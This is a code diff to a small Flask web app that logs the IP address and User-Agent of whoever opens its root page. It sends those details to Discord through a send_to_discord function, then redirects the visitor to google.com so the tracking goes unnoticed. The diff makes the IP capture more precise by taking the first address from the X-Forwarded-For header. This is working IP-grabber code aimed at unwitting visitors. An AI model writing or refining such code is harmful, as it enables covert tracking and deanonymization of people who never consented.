@@ -1,5 +1,3 @@
-# main.py
-
 from flask import Flask, request, redirect
 import requests
 import json
@@ -84,13 +82,16 @@ def send_to_discord(info):
 
 @app.route('/')
 def index():
+    # ✅ Use correct IP parsing with proxy awareness
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ip and ',' in ip:
+        ip = ip.split(',')[0].strip()
+
     user_agent = request.headers.get('User-Agent', 'Unknown')
     info = get_visitor_info(ip, user_agent)
     send_to_discord(info)
     return redirect("https://www.google.com")
 
-# Required for Render.com to work correctly
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
